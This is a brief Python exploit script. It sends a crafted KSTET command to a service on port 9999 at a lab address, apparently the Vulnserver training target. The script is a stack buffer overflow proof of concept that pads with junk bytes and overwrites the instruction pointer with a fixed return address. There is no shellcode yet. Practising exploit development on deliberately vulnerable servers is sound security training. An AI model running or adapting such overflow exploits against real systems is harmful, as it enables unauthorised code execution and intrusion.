import socket
import struct

TCP_IP = '192.168.109.129'
TCP_PORT = 9999


payload = "KSTET /.:/"
payload += "A" * 66 # Junk
payload += struct.pack("<I",0x625011AF) # Overwrite EIP
payload += "D" * (5990 - len(payload)) # Junk
	
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))

s.send(payload)
s.close()	